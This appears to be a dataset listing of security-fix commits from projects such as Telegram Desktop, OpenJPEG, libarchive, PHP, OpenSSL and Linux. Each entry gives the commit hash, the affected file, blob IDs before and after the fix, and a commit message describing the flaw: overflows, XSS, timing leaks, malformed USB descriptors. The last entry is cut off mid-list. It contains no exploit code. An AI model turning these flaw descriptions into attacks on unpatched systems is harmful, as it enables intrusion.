    388703b9ca1912a5438e37f9dd54c35805f2c594
File(s) In Commit: 
    Telegram/SourceFiles/settings.h
Blob(s) In Commit: 
    d4100aec8b2d70cfe85810ceb26df647e0dfdcc4
Blob(s) Before Fix: 
    e8c7ee2f9004b6f403db4b86fad0f6173296fbb8
Projects:
    0577215664_tdesktop
Commit Message for 388703b9ca1912a5438e37f9dd54c35805f2c594:
Fix CVE-2016-10351: Insecure cWorkingDir permissions.\n\nSet 700 permisson on dir on every start.\n\nSigned-off-by: Alexander GQ Gerasiov <gq@cs.msu.su>

======================================================================
Commit With Fix: 
    333f65bae9106182d12e02d249d4f95e16e93fa2
File(s) In Commit: 
    modules/apps/foundation/frontend-js/frontend-js-spa-web/src/main/resources/META-INF/resources/init.jsp
Blob(s) In Commit: 
    3e402560fb130a122a5a86f6b4e955efa3f3ffee
Blob(s) Before Fix: 
    5b66d64044e678fb2b634445258918221e49e4ab
    797d2c64d34da8fabc4968e779d817b9d1f9b49b
    8440c513ca9f73694ae46e6ee9ed4b647a189d93
    b513552b38fbb15a74f67852735f5f4608d60714
    b8ac4f806cff7b9720e37b9212e15240a92d7ad9
    e914d6eb9aa179211d0fab2e5909d96c6388c7ff
    f13e7f427571e5a3634159da7f190b2f73471a46
    f509714fd5ce4655056974e086fd66395d31e726
Projects:
    4lejandrito_liferay-portal
Commit Message for 333f65bae9106182d12e02d249d4f95e16e93fa2:
LPS-68469 Missing escape

======================================================================
Commit With Fix: 
    397f62c0a838e15d667ef50e27d5d011d2c79c04
File(s) In Commit: 
    src/lib/openjp2/tcd.c
Blob(s) In Commit: 
    08c5a765a12910c26243ecaeefc2a5ad9186ec0e
Blob(s) Before Fix: 
    567798525be9b93c62488cef77badf6a743c7e7d
Projects:
    01bui_openjpeg
Commit Message for 397f62c0a838e15d667ef50e27d5d011d2c79c04:
Fix write heap buffer overflow in opj_mqc_byteout(). Discovered by Ke Liu of Tencent's Xuanwu LAB (#835)

======================================================================
Commit With Fix: 
    d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b
File(s) In Commit: 
    src/lib/openjp2/pi.c
Blob(s) In Commit: 
    798867a80e3a2385d5af8af4ea2bab9aebc07542
Blob(s) Before Fix: 
    c1724fd6d979f4fd023f88ba83bf66529c18cfb0
Projects:
    01bui_openjpeg
Commit Message for d27ccf01c68a31ad62b33d2dc1ba2bb1eeaafe7b:
Avoid division by zero in opj_pi_next_rpcl, opj_pi_next_pcrl and opj_pi_next_cprl (#938)\n\nFixes issues with id:000026,sig:08,src:002419,op:int32,pos:60,val:+32 and id:000019,sig:08,src:001098,op:flip1,pos:49

======================================================================
Commit With Fix: 
    da940424816e11d624362ce080bc026adffa26e8
File(s) In Commit: 
    src/bin/jp2/convertbmp.c
Blob(s) In Commit: 
    ae83077caafce06d872fb498c766423c88fe77d6
Blob(s) Before Fix: 
    910574b8aabe89ba3bbd5691a2b3a00566d1be34
    d264823f09bcb36d667bbbc0be50228d7391b06f
Projects:
    01bui_openjpeg
Commit Message for da940424816e11d624362ce080bc026adffa26e8:
Merge pull request #834 from trylab/issue833\n\nFix issue 833.

======================================================================
Commit With Fix: 
    162ae709162be3e6c4d942313a278ca5cbdb8e92
File(s) In Commit: 
    demo/phpThumb.demo.showpic.php
Blob(s) In Commit: 
    a8d9a9b81d39b1c25a7f94e49010853f59148184
Blob(s) Before Fix: 
    d24f1603e7596ada8a5e252a177fca81db953574
Projects:
    13601313270_smarty
Commit Message for 162ae709162be3e6c4d942313a278ca5cbdb8e92:
demo.showpic security fix\n\nSanitize input data to prevent Reflected XSS problems

======================================================================
Commit With Fix: 
    b95044da6ac608e7239f7949ff21d3b65be68f82
File(s) In Commit: 
    upload/admin/model/openbay/amazon.php
Blob(s) In Commit: 
    8d9a306d9bacc1fef1c40160befdf6bb9dd55c77
Blob(s) Before Fix: 
    26d87b08065ad2be2c5dde8a8b73ac0d210de382
Projects:
    0xhacking_opencart-1
Commit Message for b95044da6ac608e7239f7949ff21d3b65be68f82:
https://github.com/opencart/opencart/issues/4114

======================================================================
Commit With Fix: 
    9a93d1f44b06605af84520509e7a0e8b64ab0c05
File(s) In Commit: 
    include/functions_search.inc.php
Blob(s) In Commit: 
    59fc97cacab75660e2df074fbe7fe2c4cb557dd5
Blob(s) Before Fix: 
    d8df4eea89a098cf552672240a5a414c42228648
Projects:
    7tonin_Piwigo
Commit Message for 9a93d1f44b06605af84520509e7a0e8b64ab0c05:
fixes #548, escape HTML chars from search expression\n\nbefore sending them to HTML comment on frontend

======================================================================
Commit With Fix: 
    b3157cbfd859c914911b114d4edbba4654758b57
File(s) In Commit: 
    include/functions.inc.php
Blob(s) In Commit: 
    39b618d812b33b409ed364d6c4bc0eacd238dddd
Blob(s) Before Fix: 
    018747817156e85b0ca7e6e384c643e71d89cb96
Projects:
    7tonin_Piwigo
Commit Message for b3157cbfd859c914911b114d4edbba4654758b57:
fixes #547, strong checks on url format

======================================================================
Commit With Fix: 
    69983495cd41bf0903fe02baeef84b1fa85f2846
File(s) In Commit: 
    auth_login.php
Blob(s) In Commit: 
    1e94426b7189f38b2fc1452c83cb85842829e795
Blob(s) Before Fix: 
    6a63f2a122b7ec968888435261cbbd22d6c2d385
Projects:
    3yahya_cacti
Commit Message for 69983495cd41bf0903fe02baeef84b1fa85f2846:
fixing bug #2697\n\nweb basic for guest accounts

======================================================================
Commit With Fix: 
    cfb1fae25f8c092e0d17073eaf7bd428ce1cd546
File(s) In Commit: 
    zebra/rtadv.c
Blob(s) In Commit: 
    2f62714d81db32a0fdb0e049c7aed7cdd8ceb19d
Blob(s) Before Fix: 
    9450f9a92d1300db6fe8b69b388e6f91d6a19bce
    b0fe683f0e94b4504d8b53130101ebda8d8d0b5c
    d4ef1b885ae851d340926ba22d54c2e575e9d03a
Projects:
    522428182_frr
Commit Message for cfb1fae25f8c092e0d17073eaf7bd428ce1cd546:
zebra: stack overrun in IPv6 RA receive code (CVE-2016-1245)\n\nThe IPv6 RA code also receives ICMPv6 RS and RA messages. Unfortunately, by bad coding practice, the buffer size specified on receiving such messages mixed up 2 constants that in fact have different values.\n\nThe code itself has:  #define RTADV_MSG_SIZE 4096 While BUFSIZ is system-dependent, in my case (x86_64 glibc):  /usr/include/_G_config.h:#define _G_BUFSIZ 8192  /usr/include/libio.h:#define _IO_BUFSIZ _G_BUFSIZ  /usr/include/stdio.h:# define BUFSIZ _IO_BUFSIZ\n\nFreeBSD, OpenBSD, NetBSD and Illumos are not affected, since all of them have BUFSIZ == 1024.\n\nAs the latter is passed to the kernel on recvmsg(), it's possible to overwrite 4kB of stack -- with ICMPv6 packets that can be globally sent to any of the system's addresses (using fragmentation to get to 8k).\n\n(The socket has filters installed limiting this to RS and RA packets, but does not have a filter for source address or TTL.)\n\nIssue discovered by trying to test other stuff, which randomly caused the stack to be smaller than 8kB in that code location, which then causes the kernel to report EFAULT (Bad address).\n\nSigned-off-by: David Lamparter <equinox@opensourcerouting.org> Reviewed-by: Donald Sharp <sharpd@cumulusnetworks.com>

======================================================================
Commit With Fix: 
    7c164a0c86cec6ee95df1d141e67b0e85dfdefd2
File(s) In Commit: 
    dbdimp.c
Blob(s) In Commit: 
    d0b46c308015aa396b6acb25355660472eee0bc9
Blob(s) Before Fix: 
    77524ecef89623824e8728504b49c8bbeb9b7fbe
Projects:
    Acidburn0zzz_DBD-mysql
Commit Message for 7c164a0c86cec6ee95df1d141e67b0e85dfdefd2:
Do not use unsafe sprintf w/variable length input\n\nThis can cause a  buffer overflow to occur when reporting error message about validation of (untrusted) user input parameters.

======================================================================
Commit With Fix: 
    d0331e8e5b05b475f20b1f3101fe1ad772d7e7e7
File(s) In Commit: 
    libarchive/archive_read_support_format_zip.c
Blob(s) In Commit: 
    0a0be96b5990ba0a7837fb9e53dd744900864d51
Blob(s) Before Fix: 
    0f8262c625621a8fd7dbba6354940741c2e22edc
    450a6f7da51908d6894a0b3b909df087051b40c8
    c0b47c86010ea0cf26fd7d5900abfbe5122af43c
Projects:
    AasemShokr_libarchive
Commit Message for d0331e8e5b05b475f20b1f3101fe1ad772d7e7e7:
Issue #656:  Fix CVE-2016-1541, VU#862384\n\nWhen reading OS X metadata entries in Zip archives that were stored without compression, libarchive would use the uncompressed entry size to allocate a buffer but would use the compressed entry size to limit the amount of data copied into that buffer.  Since the compressed and uncompressed sizes are provided by data in the archive itself, an attacker could manipulate these values to write data beyond the end of the allocated buffer.\n\nThis fix provides three new checks to guard against such manipulation and to make libarchive generally more robust when handling this type of entry:  1. If an OS X metadata entry is stored without compression,     abort the entire archive if the compressed and uncompressed     data sizes do not match.  2. When sanity-checking the size of an OS X metadata entry,     abort this entry if either the compressed or uncompressed     size is larger than 4MB.  3. When copying data into the allocated buffer, check the copy     size against both the compressed entry size and uncompressed     entry size.

======================================================================
Commit With Fix: 
    2871c70efaaaa0f102557a17c727fd4d5204dd4b
File(s) In Commit: 
    ext/standard/exec.c
Blob(s) In Commit: 
    c4afce333735961fd33360bec7e0812185ec3465
Blob(s) Before Fix: 
    7b783ca60f60fd2bec2896eabcbfdc811d8f5c98
    82d4db7a93e75b022318f1ec242647fe71299dfe
    8dd0d5dfd742aa3fffdd8a22e8f3f5c11ef3f5c6
    c724b795357aa67a61c239bd58244778e62d2196
Projects:
    0014593_php-src
Commit Message for 2871c70efaaaa0f102557a17c727fd4d5204dd4b:
Patch for Heap Buffer Overflow in EscapeShell\n\nProposed patch for bug #71270

======================================================================
Commit With Fix: 
    0d3181324c816bdf664ca5e1548dfe8eb05c54f8
File(s) In Commit: 
    htdocs/core/lib/functions.lib.php
Blob(s) In Commit: 
    81412531262cd4267f3d47536a92b1374487bac6
Blob(s) Before Fix: 
    c530f612d2959fa062eb00ffedfdf64a1be09b66
Projects:
    01viniciusmelo_dolibarr
Commit Message for 0d3181324c816bdf664ca5e1548dfe8eb05c54f8:
FIX #2857, #4291 & #4341 Escape GETPOST alpha data by default\n\nThis should mitigate most HTML injections allowing XSS.

======================================================================
Commit With Fix: 
    019c4f25d500ec5db9ba3b84cc961a7e4e850738
File(s) In Commit: 
    js/normalization.js
Blob(s) In Commit: 
    196e83aed9d93ea4c5a77d77da195dcb2685c740
Blob(s) Before Fix: 
    5ac085f8ba57d40053ed58c2ba9ee5fed45d46ff
    951bc9c51a5420dd28df3a390998aac1b8cb8ad2
    d23adf6ea90fd89ff79e56405ea20ee431574bf5
Projects:
    007durgesh219_phpmyadmin
Commit Message for 019c4f25d500ec5db9ba3b84cc961a7e4e850738:
Fix XSS in normalization.php\n\nSigned-off-by: Madhura Jayaratne <madhura.cj@gmail.com>

======================================================================
Commit With Fix: 
    c57d3cc7b97b5f32801032f7bb222297aa97dfea
File(s) In Commit: 
    libraries/sql-parser/autoload.php
Blob(s) In Commit: 
    da6bfe0a8ccf9a6f08e8f1b7452ab0802153dc26
Blob(s) Before Fix: 
    21298b6ced0fd439e419917cf5f42288f191e719
    85f0d6c986b08baf916fa9440e2a47a0b6c9dd32
Projects:
    007durgesh219_phpmyadmin
Commit Message for c57d3cc7b97b5f32801032f7bb222297aa97dfea:
Avoid invalid invocation of SQL parser\n\nSigned-off-by: Michal Čihař <michal@cihar.com>

======================================================================
Commit With Fix: 
    63ef0b41dc48d6112d1918c1b1de9de8ea90adb5
File(s) In Commit: 
    src/hb-ot-font.cc
Blob(s) In Commit: 
    69d2503abbf5caf9f62133c68a5421c8a461b79a
Blob(s) Before Fix: 
    2af2f54a75932abf0232fdbadae2a02dc5068f6f
    3102784e2cad502880d9213b7364451d878a3ff4
    8d3330070b18ba8b4fe8b20b75c0562209c99e2a
    9cde838983371e6b362085aaeec459503de469e5
    df6514dd31f1c91bf490ba9ecea2542f96fb6f6c
Projects:
    00ERNEST00_FFmpeg
    031087_harfbuzz
Commit Message for 63ef0b41dc48d6112d1918c1b1de9de8ea90adb5:
[ot-font] Fix hmtx wrong table length check\n\nDiscovered by libFuzzer.  Ouch!\n\nhttps://github.com/behdad/harfbuzz/issues/139#issuecomment-148289957

======================================================================
Commit With Fix: 
    0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f
File(s) In Commit: 
    lib/asn1_decoder.c
Blob(s) In Commit: 
    3f74dd3e29107fa407df14cc8a8b0cf05087e9eb
Blob(s) Before Fix: 
    11b9b01fda6b67303db4a7df22c19e2c35c4c095
    14c31b6bc18c9d6d7d1a58ae37623049012523a5
    3787d02e2c49ee8d1267999008b342663e56d9fe
    55980d7e1ac00b00bce1a5a8dd56db9254725dc9
    621017e75cba5d6426a49074be52421ddd55be20
    d60ce8a536503616166f240a543b2d96a9642f45
    fb3656459f05ae341995bd9b8156be68c6dfdb96
Projects:
    0-T-0_ps4-linux
Commit Message for 0d62e9dd6da45bbf0f33a8617afc5fe774c8f45f:
ASN.1: Fix non-match detection failure on data overrun\n\nIf the ASN.1 decoder is asked to parse a sequence of objects, non-optional matches get skipped if there's no more data to be had rather than a data-overrun error being reported.\n\nThis is due to the code segment that decides whether to skip optional matches (ie. matches that could get ignored because an element is marked OPTIONAL in the grammar) due to a lack of data also skips non-optional elements if the data pointer has reached the end of the buffer.\n\nThis can be tested with the data decoder for the new RSA akcipher algorithm that takes three non-optional integers.  Currently, it skips the last integer if there is insufficient data.\n\nWithout the fix, #defining DEBUG in asn1_decoder.c will show something like:\n\n	next_op: pc=0/13 dp=0/270 C=0 J=0 	- match? 30 30 00 	- TAG: 30 266 CONS 	next_op: pc=2/13 dp=4/270 C=1 J=0 	- match? 02 02 00 	- TAG: 02 257 	- LEAF: 257 	next_op: pc=5/13 dp=265/270 C=1 J=0 	- match? 02 02 00 	- TAG: 02 3 	- LEAF: 3 	next_op: pc=8/13 dp=270/270 C=1 J=0 	next_op: pc=11/13 dp=270/270 C=1 J=0 	- end cons t=4 dp=270 l=270/270\n\nThe next_op line for pc=8/13 should be followed by a match line.\n\nThis is not exploitable for X.509 certificates by means of shortening the message and fixing up the ASN.1 CONS tags because:\n\n (1) The relevant records being built up are cleared before use.\n\n (2) If the message is shortened sufficiently to remove the public key, the      ASN.1 parse of the RSA key will fail quickly due to a lack of data.\n\n (3) Extracted signature data is either turned into MPIs (which cope with a      0 length) or is simpler integers specifying algoritms and suchlike      (which can validly be 0)  and\n\n (4) The AKID and SKID extensions are optional and their removal is handled      without risking passing a NULL to asymmetric_key_generate_id().\n\n (5) If the certificate is truncated sufficiently to remove the subject,      issuer or serialNumber then the ASN.1 decoder will fail with a 'Cons      stack underflow' return.\n\nThis is not exploitable for PKCS#7 messages by means of removal of elements from such a message from the tail end of a sequence:\n\n (1) Any shortened X.509 certs embedded in the PKCS#7 message are survivable      as detailed above.\n\n (2) The message digest content isn't used if it shows a NULL pointer,      similarly, the authattrs aren't used if that shows a NULL pointer.\n\n (3) A missing signature results in a NULL MPI - which the MPI routines deal      with.\n\n (4) If data is NULL, it is expected that the message has detached content and      that is handled appropriately.\n\n (5) If the serialNumber is excised, the unconditional action associated      with it will pick up the containing SEQUENCE instead, so no NULL      pointer will be seen here.\n\n     If both the issuer and the serialNumber are excised, the ASN.1 decode      will fail with an 'Unexpected tag' return.\n\n     In either case, there's no way to get to asymmetric_key_generate_id()      with a NULL pointer.\n\n (6) Other fields are decoded to simple integers.  Shortening the message      to omit an algorithm ID field will cause checks on this to fail early      in the verification process.\n\n This can also be tested by snipping objects off of the end of the ASN.1 stream such that mandatory tags are removed - or even from the end of internal SEQUENCEs.  If any mandatory tag is missing, the error EBADMSG *should* be produced.  Without this patch ERANGE or ENOPKG might be produced or the parse may apparently succeed, perhaps with ENOKEY or EKEYREJECTED being produced later, depending on what gets snipped.\n\nJust snipping off the final BIT_STRING or OCTET_STRING from either sample should be a start since both are mandatory and neither will cause an EBADMSG without the patches\n\nReported-by: Marcel Holtmann <marcel@holtmann.org> Signed-off-by: David Howells <dhowells@redhat.com> Tested-by: Marcel Holtmann <marcel@holtmann.org> Reviewed-by: David Woodhouse <David.Woodhouse@intel.com>

======================================================================
Commit With Fix: 
    8b8a321ff72c785ed5e8b4cf6eda20b35d427390
File(s) In Commit: 
    net/ipv4/tcp_input.c
Blob(s) In Commit: 
    d4c51158470f5afb7cee8a5c875b5f9ed5b04e14
Blob(s) Before Fix: 
    05f10df6ee861cf52897db097852298bda26038d
    064f1a0bef6d8a22adab0c920d745ef6960ed435
    075ab4d5af5e46e7a5a177a324228df592cbe5e3
    0a2b61dbcd4e85f33ebdc745715b6637319345a2
    22917918fa80c5ea4668e7b4f522c4153db78aac
    257b61789eeba9fd064470c91e3a8bffb8d1812d
    2d656eef7f8e16458127ba591e0a4154365f6a83
    3898694d03003668cd068d4558c827e0af969ef0
    3a4d9b34bed44a2f6b77b2be0e753867bad32292
    3b2c8e90a475d91bc30ca5fd8b75f23285eac07d
    3ebf45b38bc309f448dbc4f27fe8722cefabaf19
    40639c288dc229d205eccb257886d8867d973759
    5b10c59ba8a954549c06faef5cd03733b34523a9
    684f095d196e20333adb235fc96a8fb8f0dd691c
    728f5b3d3c64197bb526240a078744d5a950c8ea
    87463c8148962f3481d88cfdc75c863a955240bb
    8fdd27b173061def484663beeace691a8bfa2365
    9c6225780bd5aafdb175a762d45c704e82416582
    a8f515bb19c4bbd2d379c6f5c29f9a3d02e8bc96
    c9ab964189a0162c7de19d4319f6c3e56194117b
    d107ee246a1d32703ccc260309d52c3493927862
    d6b46eb2f94c5e6fb7eb77592722115eed9c8d7c
    da34f830f4bc17ba611a6151d4feebc4ae5faa72
    f501ac0483665aeb1100e2f2776d3f38610e9b30
    fdd88c3803a673881053039cdc8ff44bc1b8aa4a
Projects:
    0-T-0_ps4-linux
Commit Message for 8b8a321ff72c785ed5e8b4cf6eda20b35d427390:
tcp: fix zero cwnd in tcp_cwnd_reduction\n\nPatch 3759824da87b ("tcp: PRR uses CRB mode by default and SS mode conditionally") introduced a bug that cwnd may become 0 when both inflight and sndcnt are 0 (cwnd = inflight + sndcnt). This may lead to a div-by-zero if the connection starts another cwnd reduction phase by setting tp->prior_cwnd to the current cwnd (0) in tcp_init_cwnd_reduction().\n\nTo prevent this we skip PRR operation when nothing is acked or sacked. Then cwnd must be positive in all cases as long as ssthresh is positive:\n\n1) The proportional reduction mode    inflight > ssthresh > 0\n\n2) The reduction bound mode   a) inflight == ssthresh > 0\n\n  b) inflight < ssthresh      sndcnt > 0 since newly_acked_sacked > 0 and inflight < ssthresh\n\nTherefore in all cases inflight and sndcnt can not both be 0. We check invalid tp->prior_cwnd to avoid potential div0 bugs.\n\nIn reality this bug is triggered only with a sequence of less common events.  For example, the connection is terminating an ECN-triggered cwnd reduction with an inflight 0, then it receives reordered/old ACKs or DSACKs from prior transmission (which acks nothing). Or the connection is in fast recovery stage that marks everything lost, but fails to retransmit due to local issues, then receives data packets from other end which acks nothing.\n\nFixes: 3759824da87b ("tcp: PRR uses CRB mode by default and SS mode conditionally") Reported-by: Oleksandr Natalenko <oleksandr@natalenko.name> Signed-off-by: Yuchung Cheng <ycheng@google.com> Signed-off-by: Neal Cardwell <ncardwell@google.com> Signed-off-by: Eric Dumazet <edumazet@google.com> Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    613317bd212c585c20796c10afe5daaa95d4b0a1
File(s) In Commit: 
    security/integrity/evm/evm_main.c
Blob(s) In Commit: 
    e6ea9d4b1de91a8d58e3ccab0fd3cef222ea6fcd
Blob(s) Before Fix: 
    063d38aef64e71a00763997752f93983fa9702d6
    10f994307a04ec0473fef1795a4b8b0cca3755e3
    1334e02ae8f412910151d73acc670745f01ca2bf
    336b3ddfe63f5304374f860419cd3f5251bde5b8
    3bcb80df4d01f1ca30927c7e61c6b2b19b5ca15f
    3d145a3ffccff3a417a40321e66b11a838c13e53
    582091498819126dd39a341d53079ad19a0b3acf
    970772c731ff3f485047abf0e7e274171b52dea3
    b9e26288d30c23a43c0f7648471008791a93f9f3
    c5ee1a7c5e8a0a361a8fb21de3ee236faba3804a
    cdbde1762189f56ebdcd133e3cf6fdfba37b3933
    d96b7f6a3b44ad73b3aeb13f9ad14d7f935f885d
    eb5484504f506490eb7c4f90a81cba92b7020c40
    f589c9a05da29f6bf40cfd903858ee1569791c41
    f7160253f17faad71c17a86b19833123a2edebd4
Projects:
    0-T-0_ps4-linux
Commit Message for 613317bd212c585c20796c10afe5daaa95d4b0a1:
EVM: Use crypto_memneq() for digest comparisons\n\nThis patch fixes vulnerability CVE-2016-2085.  The problem exists because the vm_verify_hmac() function includes a use of memcmp(). Unfortunately, this allows timing side channel attacks  specifically a MAC forgery complexity drop from 2^128 to 2^12.  This patch changes the memcmp() to the cryptographically safe crypto_memneq().\n\nReported-by: Xiaofei Rex Guo <xiaofei.rex.guo@intel.com> Signed-off-by: Ryan Ware <ware@linux.intel.com> Cc: stable@vger.kernel.org Signed-off-by: Mimi Zohar <zohar@linux.vnet.ibm.com> Signed-off-by: James Morris <james.l.morris@oracle.com>

======================================================================
Commit With Fix: 
    f43bfaeddc79effbf3d0fcb53ca477cca66f3db8
File(s) In Commit: 
    drivers/net/ethernet/atheros/atlx/atl2.c
Blob(s) In Commit: 
    2ff465848b6553ecc0a646421e30cded0e8fb053
Blob(s) Before Fix: 
    071f4c858969dad5ff166d69f62073f4c0518b09
    097a0bf592abc232c5ed70e11bccaea31002285e
    265ce1b752ed0b169a927f6dad148e694ca4c5a2
    3aba383227172222cc6b0e553676ee421237a92c
    46a535318c7af64ea586baf230067f9e2d4ade5b
    57d64b80fd72c08f493ca42e6157b746291e1dbe
    63f2deec2a52994684fa7a58763f68502265542e
    6746bd7171460100a4d224e55bdcbe62a4efcecf
    6762dc406b25ab10c1424e899f8d16913088c35e
    6911394115b20e7023d89feb4d757750c50f604d
    77a1c03255defa77f2c662650d41a1ffc68eb7bb
    78befb522a528268fae32c68649ead0a01263366
    84a09e8ddd9c92e27a165473aeb2f05d89ac1990
    8f76f4558a88c15b0a14bb6ec3d9fb769fea9d0a
    96fe542b4acb58fbf5f37bf8d2b3e4a1ff750a64
    972ee645fac69fc5b837b40d5f569e811acf23a6
    bb41becb66099389216192c761541ad1fd51790d
    e7df96a5fccdd4f11e1b3cb733ee859ddb3b3b08
Projects:
    0-T-0_ps4-linux
Commit Message for f43bfaeddc79effbf3d0fcb53ca477cca66f3db8:
atl2: Disable unimplemented scatter/gather feature\n\natl2 includes NETIF_F_SG in hw_features even though it has no support for non-linear skbs.  This bug was originally harmless since the driver does not claim to implement checksum offload and that used to be a requirement for SG.\n\nNow that SG and checksum offload are independent features, if you explicitly enable SG *and* use one of the rare protocols that can use SG without checkusm offload, this potentially leaks sensitive information (before you notice that it just isn't working).  Therefore this obscure bug has been designated CVE-2016-2117.\n\nReported-by: Justin Yackoski <jyackoski@crypto-nite.com> Signed-off-by: Ben Hutchings <ben@decadent.org.uk> Fixes: ec5f06156423 ("net: Kill link between CSUM and SG features.") Signed-off-by: David S. Miller <davem@davemloft.net>

======================================================================
Commit With Fix: 
    0ed26acce328ec16a3aa635f1ca37365e8c7403a
File(s) In Commit: 
    crypto/ts/ts_lib.c
Blob(s) In Commit: 
    e18f1f3f7e3ff93b9d83dedfd5b5c3d35da3ff98
Blob(s) Before Fix: 
    087334bcbd49229aa317f58e4b37b99f2b2a7538
    bde1bd75e47ed8beb8a552537ce716506b6da1ff
    fb871d2a0fffe7e5a6c2ea70e6eeb583f18f98f1
Projects:
    0902710055_openssl
Commit Message for 0ed26acce328ec16a3aa635f1ca37365e8c7403a:
Fix OOB read in TS_OBJ_print_bio().\n\nTS_OBJ_print_bio() misuses OBJ_txt2obj: it should print the result as a null terminated buffer. The length value returned is the total length the complete text reprsentation would need not the amount of data written.\n\nCVE-2016-2180\n\nThanks to Shi Lei for reporting this bug.\n\nReviewed-by: Matt Caswell <matt@openssl.org>

======================================================================
Commit With Fix: 
    0f886ca12765d20124bd06291c82951fd49a33be
File(s) In Commit: 
    sound/usb/quirks.c
Blob(s) In Commit: 
    529c35cceaa6f37ffc56a9f8fa69ebcaea1b3603
Blob(s) Before Fix: 
    5b03296a5bd9ef4977d22f0d026157b76553a1ab
Projects:
    0-T-0_ps4-linux
Commit Message for 0f886ca12765d20124bd06291c82951fd49a33be:
ALSA: usb-audio: Fix NULL dereference in create_fixed_stream_quirk()\n\ncreate_fixed_stream_quirk() may cause a NULL-pointer dereference by accessing the non-existing endpoint when a USB device with a malformed USB descriptor is used.\n\nThis patch avoids it simply by adding a sanity check of bNumEndpoints before the accesses.\n\nBugzilla: https://bugzilla.suse.com/show_bug.cgi?id=971125 Cc: <stable@vger.kernel.org> Signed-off-by: Takashi Iwai <tiwai@suse.de>

======================================================================
Commit With Fix: 
    950336ba3e4a1ffd2ca60d29f6ef386dd2c7351d
File(s) In Commit: 
    drivers/input/misc/ati_remote2.c
Blob(s) In Commit: 
    1c5914cae8533326e17b878b406bedca130912d6
Blob(s) Before Fix: 
    0501f0e65157bdfb1e1d90fd7ff1846d10c97eb0
    305f0160506a043b84576480b05b858ff38e43e1
    874a51c2fbb2821049be81efc57dbff86b6b3525
    cfd58e87da2620061f2d93e01244c9d052319991
    d8fd58fdf05086efaef0d58b0d6676e0e69916cf
    e8c6a4842e91c2038a8359f088f64c7bbfb6f639
    ebf4448b31b90c1338e545acc6c3dc1c917126d1
    f63341f20b91aed210208d62bf50c17b9da261c5
Projects:
    0-T-0_ps4-linux
Commit Message for 950336ba3e4a1ffd2ca60d29f6ef386dd2c7351d:
Input: ati_remote2 - fix crashes on detecting device with invalid descriptor\n\nThe ati_remote2 driver expects at least two interfaces with one endpoint each. If given malicious descriptor that specify one interface or no endpoints, it will crash in the probe function. Ensure there is at least two interfaces and one endpoint for each interface before using it.\n\nThe full disclosure: http://seclists.org/bugtraq/2016/Mar/90\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    9c6ba456711687b794dcf285856fc14e2c76074f
File(s) In Commit: 
    drivers/input/misc/powermate.c
Blob(s) In Commit: 
    84909a12ff36c231e7bcfc545bc2ce180c6cd26f
Blob(s) Before Fix: 
    21ce1cf757bb99c10a3f3cb4fd293cbd5b064bfc
    49c0c3ebd32141442acbc58deb9ef0b7e8f1b402
    538f7049ec644b553760bd37b6bb422d32bd0a10
    5c8c79623c8744ac82042154836b36a51cfc9723
    63b539d3dabae13ce7d1cb12fe19322f655043fd
    a53c4885fbadc96b3805625af212ed4ada1a64e4
    c4e0e1886061fbf1a5367a536f36818d97baf94e
    e8de3aaf9f6330a276c99387fab80573a5bf6dd6
Projects:
    0-T-0_ps4-linux
Commit Message for 9c6ba456711687b794dcf285856fc14e2c76074f:
Input: powermate - fix oops with malicious USB descriptors\n\nThe powermate driver expects at least one valid USB endpoint in its probe function.  If given malicious descriptors that specify 0 for the number of endpoints, it will crash.  Validate the number of endpoints on the interface before using them.\n\nThe full report for this issue can be found here: http://seclists.org/bugtraq/2016/Mar/85\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Cc: stable <stable@vger.kernel.org> Signed-off-by: Josh Boyer <jwboyer@fedoraproject.org> Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    162f98dea487206d9ab79fc12ed64700667a894d
File(s) In Commit: 
    drivers/input/tablet/gtco.c
Blob(s) In Commit: 
    7c18249d6c8e820e3fe86ffa66196164dbef2d3f
Blob(s) Before Fix: 
    3a7f3a4a439635064a4e8ca78e1e7860b9072a47
    3d32d3f4e486629d653330b38aafc59fb44d1af7
    4113413dab634be444f187c97964e348d7e20ad5
    4b8b9d7aa75e2785991fc5838bf55728c715e6fe
    858045694e9d73f8ade7fe9d2327ec6594cb12c6
    89a297801dce7e8d4c03abf98d851b898177f1ee
    8b68a210277b242cd8327eaa2d97d13b50c652bc
    9a2d200bf28392f49f1de15d8c4e9b39171f294d
    a51de543a0b2f66ff3ef272801c6f00b817c686a
    a9f8f925ba2b22c32c146226745d3e2acca894b1
    abf09ac42ce43ef5e32d3202d7fa47f6d8aa2934
    caecffe8caff3e3742e08d9531b3f4eea3ae5ac7
Projects:
    0-T-0_ps4-linux
Commit Message for 162f98dea487206d9ab79fc12ed64700667a894d:
Input: gtco - fix crash on detecting device without endpoints\n\nThe gtco driver expects at least one valid endpoint. If given malicious descriptors that specify 0 for the number of endpoints, it will crash in the probe function. Ensure there is at least one endpoint on the interface before using it.\n\nAlso let's fix a minor coding style issue.\n\nThe full correct report of this issue can be found in the public Red Hat Bugzilla:\n\nhttps://bugzilla.redhat.com/show_bug.cgi?id=1283385\n\nReported-by: Ralf Spenneberg <ralf@spenneberg.net> Signed-off-by: Vladis Dronov <vdronov@redhat.com> Cc: stable@vger.kernel.org Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

======================================================================
Commit With Fix: 
    4ec0ef3a82125efc36173062a50624550a900ae0
File(s) In Commit: 
    drivers/usb/misc/iowarrior.c
Blob(s) In Commit: 
    1950e87b4219047908dfdad73fe30650cad7b8ca
Blob(s) Before Fix: 
    05aa716cf6b5c24de114bd77b5f09dc4c86fc8d8
    095778ff984de25838b1e0eda53e0794dd382f8c
    0ef29d202263666d2c047237b1b6c25954d63a61
    20bcfdd7eace3029dd1260c0c0210f35fe3875c5
    381a92a0ebb61eaa0262574fa659a3171c510733
    4fd0dc835ae566e1a115e363c23e5e3ccba5ef0e
    5e43fd881a9cc3a4449682d65e831e4e423c03d3
    67a79660a1a9165e9d7559075ba9f05ae5cedbab
    7676b5b7e17130fa2f3faace93c89ca0ff541bce
    775690bed4c0cac2f70f40d1eae7dfa4db9d364a
    b64bbf4c668e497c2240b4e4ca816904f6df758b
